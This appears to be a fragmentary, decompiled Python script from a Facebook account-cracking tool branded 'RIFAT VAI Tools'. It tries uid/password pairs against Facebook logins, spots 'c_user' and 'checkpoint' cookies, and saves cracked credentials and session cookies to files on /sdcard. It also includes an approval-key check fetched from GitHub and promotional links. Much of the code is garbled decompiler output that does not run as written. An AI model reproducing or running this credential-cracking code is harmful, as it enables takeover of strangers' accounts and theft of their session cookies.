...
os.system('espeak -a 300 "    Hey,     Baby,     Welcome,    to,   RIFAT,   VAI,  Tools"')
print('\x1b[0;92m[•]Join To My Fb Group🌺 ')
time.sleep(2)
os.system('xdg-open https://facebook.com/groups/215918377867011/')
time.sleep(2)
print('\x1b[0;93m[•]Follow My Github Account<3 ')
time.sleep(2)
os.system('xdg-open https://github.com/RIFAT-VAI143')
...
def login():
    ...
    if None in ('i', '0i'):
        ...
        return None
    if None in ('2', '02'):
        os.system('xdg-open https://wa.me/+8801764796066')
        return None
    if None in ('0',):
...
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        ...
        if 'checkpoint' in po.cookies.get_dict().keys():
            ...
            open('/sdcard/RIFAT-M1-Cp.txt', 'a').write(uid + '|' + pas + '\n')
            akun.append(idf + ' • ' + pw)
            cp += 1
            ';'.join
...
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            ...
            open('/sdcard/RIFAT-M1-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
            ';'.join
...
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        ...
        if 'checkpoint' in po.cookies.get_dict().keys():
            ...
            os.system('espeak -a 300 " Cp,"')
            open('/sdcard/RIFAT-M2-Cp.txt', 'a').write(uid + '|' + pas + '\n')
            akun.append(idf + ' • ' + pw)
            cp += 1
            ';'.join
        if 'c_user' in ses.cookies.get_dict().keys():
...
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            ...
            os.system('espeak -a 300 " Rifat,  Ok,  id"')
            open('/sdcard/RIFAT-M2-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
            ';'.join
        if requests.exceptions.ConnectionError:
            time.sleep(31)
        loop += 1
...
def RMX():
    ...
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = '-'.join(uuid)
    dgp = requests.get('https://github.com/SOHAN-MARJAN/approval.txt/blob/main/approval.txt').text
    if id in dgp:
        msg = str(os.geteuid())
        time.sleep(0.3)
        login()
    ...
    print('\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] \x1b[1;97m𝒀𝑶𝑼𝑹 𝑲𝑬𝒀 :\x1b[1;92m RIFAT=' + id)
    print('\x1b[1;97m┗─────────────────────────────────────────┛')
    os.system('')
    time.sleep(3)
    sys.exit()
